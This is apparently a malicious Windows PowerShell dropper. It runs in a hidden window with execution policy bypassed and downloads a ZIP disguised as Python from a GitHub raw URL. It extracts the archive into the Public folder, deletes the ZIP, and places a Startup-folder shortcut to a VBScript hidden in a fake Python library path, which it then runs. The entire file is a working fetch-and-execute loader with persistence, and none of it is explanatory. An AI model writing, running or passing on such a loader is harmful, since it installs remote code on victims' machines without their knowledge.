cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"

# Define URL and download path
$url = "https://github.com/Ladyhaha06/main/raw/refs/heads/main/Python.zip"
$publicDir = "$env:Public"
$outputDir = Join-Path -Path $publicDir -ChildPath "Python"
$outputFile = Join-Path -Path $publicDir -ChildPath "Python.zip"

# Create destination directory if it doesn't exist
if (!(Test-Path -Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

# Download the ZIP file
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($url, $outputFile)
    Write-Output "Downloaded successfully: $outputFile"
} catch {
    Write-Output "Error downloading: $url"
    Write-Output "Error details: $_"
    exit
}

# Extract ZIP file
if (Test-Path -Path $outputFile) {
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($outputFile, $outputDir)
        Write-Output "Extraction completed: $outputFile to $outputDir"

        # Delete ZIP file after extraction
        Remove-Item -Path $outputFile -Force
        Write-Output "Deleted ZIP file: $outputFile"
    } catch {
        Write-Output "Error during extraction: $_"
    }
} else {
    Write-Output "ZIP file not found: $outputFile"
    exit
}

# Create Shortcut for Python.vbs in the specified directory
$TargetFile = "C:\Users\Public\Python\Lib\lib2to3\Python.vbs"
$ShortcutName = "Python.lnk"
$StartupDir = [Environment]::GetFolderPath("Startup")
$ShortcutPath = Join-Path -Path $StartupDir -ChildPath $ShortcutName

try {
    # Create WScript.Shell object
    $Shell = New-Object -ComObject WScript.Shell

    # Create Shortcut
    $Shortcut = $Shell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = $TargetFile
    $Shortcut.WorkingDirectory = (Split-Path -Path $TargetFile)
    $Shortcut.Save()

    Write-Host "Shortcut created at $ShortcutPath"

    # Execute Shortcut
    Start-Process -FilePath $ShortcutPath
    Write-Output "Shortcut executed: $ShortcutPath"
} catch {
    Write-Output "Error creating or executing Shortcut: $_"
}
